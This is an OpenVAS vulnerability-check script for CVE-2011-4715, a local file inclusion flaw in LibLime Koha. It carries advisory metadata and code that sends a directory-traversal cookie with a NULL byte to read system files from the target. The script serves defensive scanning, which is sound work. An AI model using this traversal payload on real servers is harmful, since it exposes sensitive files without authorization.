###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_liblime_koha_kohaopaclanguage_param_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# LibLime Koha 'KohaOpacLanguage' Parameter Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of
  the Web server process.
  Impact Level: Application";
tag_affected = "LibLime Koha versions 4.02.06 and prior.";
tag_insight = "The flaw is due to the cgi-bin/opac/opac-main.pl script not properly
  sanitizing user input supplied to the cgi-bin/koha/mainpage.pl script via
  the 'KohaOpacLanguage' cookie. This can be exploited to include arbitrary
  files from local resources via directory traversal attacks and URL-encoded
  NULL bytes.";
tag_solution = "No solution or patch is available as of 29th, November 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.koha.org";
tag_summary = "The host is running LibLime Koha and is prone to local file
  inclusion vulnerability.";

if(description)
{
  script_id(902593);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4715");
  script_bugtraq_id(50812);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-29 17:17:17 +0530 (Tue, 29 Nov 2011)");
  script_name("LibLime Koha 'KohaOpacLanguage' Parameter Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if LibLime Koha is vulnerable to local file inclusion");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77322");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46980/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18153");
  script_xref(name : "URL" , value : "http://www.vigasis.com/en/?guncel_guvenlik=LibLime%20Koha%20%3C=%204.2%20Local%20File%20Inclusion%20Vulnerability&amp;lnk=exploits/18153");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list(cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item: dir + "/koha/opac-main.pl", port:port);
  res = http_send_recv(port:port, data:req);

  ## Confirm the application before trying exploit
  if("koha" >< res && "Library" >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct Directory Traversal Attack,
      cookie = "sessionID=1;KohaOpacLanguage=../../../../../../../../" +
               files[file] + "%00";
      req1 = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');

      ## Send exploit
      res = http_send_recv(port:port, data:req1);

      ## Check the response to confirm vulnerability
      if(egrep(pattern:file, string:res))
      {
        security_warning(port);
        exit(0);
      }
    }
  }
}
